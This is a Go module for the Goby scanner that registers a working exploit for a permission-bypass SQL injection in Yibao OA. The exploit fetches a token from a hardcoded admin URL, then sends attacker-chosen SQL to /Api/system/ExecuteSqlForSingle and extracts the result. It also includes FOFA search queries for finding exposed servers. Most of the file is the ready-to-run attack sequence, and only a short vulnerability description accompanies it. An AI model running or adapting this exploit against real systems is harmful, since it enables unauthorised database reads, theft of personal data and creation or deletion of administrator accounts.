package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yibao OA /Api/system/ExecuteSqlForSingle  Permission Bypass SQL Injection Vulnerability",
    "Description": "<p>Yibao OA System Q is a comprehensive software platform that provides services specifically for the daily office work of enterprises and institutions, with various functions such as information management, process management, knowledge management (archive and business management), and collaborative office. </p><p>Vulnerability hazard: Attackers can access data in databases, steal user privacy and personal information, and cause user information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts without authorization. Even obtaining server privileges.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-05-08",
    "PostTime": "2024-05-11",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"$.cookie(\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"",
    "GobyQuery": "body=\"$.cookie(\\\\\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"",
    "Level": "2",
    "Impact": "<p>Attackers can access data in databases, steal user privacy and personal information, and cause user information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts without authorization. Even obtaining server privileges.</p>",
    "Recommendation": "<p>Update to the latest version: <a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "dbversion,custom",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select+%40%40version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/SmartTradeScan/Login/admin?token=topvision",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "token",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|(?:token=)(.*?)(?:\">)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/Api/system/ExecuteSqlForSingle?token={{{token}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                    "Content-Length": "39",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "{{{fixedhostinfo}}}",
                    "Referer": "{{{fixedhostinfo}}}/Api/system/ExecuteSqlForSingle?token=5D859C2B9AFCC4F4E44EBB5C872A7224B01E17454B6196F0529B5E32744EB1B0",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "sql=select+%40%40version&strParameters="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/SmartTradeScan/Login/admin?token=topvision",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/SmartTradeScan/Login/admin?token=topvision"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/SmartTradeScan/Login/admin?token=topvision",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "token",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|(?:token=)(.*?)(?:\">)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/Api/system/ExecuteSqlForSingle?token={{{token}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                    "Content-Length": "39",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "{{{fixedhostinfo}}}",
                    "Referer": "{{{fixedhostinfo}}}/Api/system/ExecuteSqlForSingle?token=5D859C2B9AFCC4F4E44EBB5C872A7224B01E17454B6196F0529B5E32744EB1B0",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "sql={{{custom}}}&strParameters="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?:data\":)(.*?)(?:,)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "易宝OA  /Api/system/ExecuteSqlForSingle 权限绕过sql注入漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝 OA系统Q是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理、知识管理(档案和业务管理)、协同办公等多种功能。</p><p>漏洞危害：攻击者可以访问<a href=\"https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020\">数据库</a>中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。 可以对<a href=\"https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020\">数据库</a>的数据进行增加或删除操作，例如私自添加或删除管理员账号。甚至拿到服务器权限。</p>",
            "Recommendation": "<p>更新至最新版本：<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></p>",
            "Impact": "<p>攻击者可以访问<a href=\"https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020\">数据库</a>中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。 可以对<a href=\"https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.7020\">数据库</a>的数据进行增加或删除操作，例如私自添加或删除管理员账号。甚至拿到服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Yibao OA /Api/system/ExecuteSqlForSingle  Permission Bypass SQL Injection Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Yibao OA System Q is a comprehensive software platform that provides services specifically for the daily office work of enterprises and institutions, with various functions such as information management, process management, knowledge management (archive and business management), and collaborative office.&nbsp;</p><p>Vulnerability hazard: Attackers can access data in databases, steal user privacy and personal information, and cause user information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts without authorization. Even obtaining server privileges.</p>",
            "Recommendation": "<p>Update to the latest version: <a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a><br></p>",
            "Impact": "<p>Attackers can access data in databases, steal user privacy and personal information, and cause user information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts without authorization. Even obtaining server privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
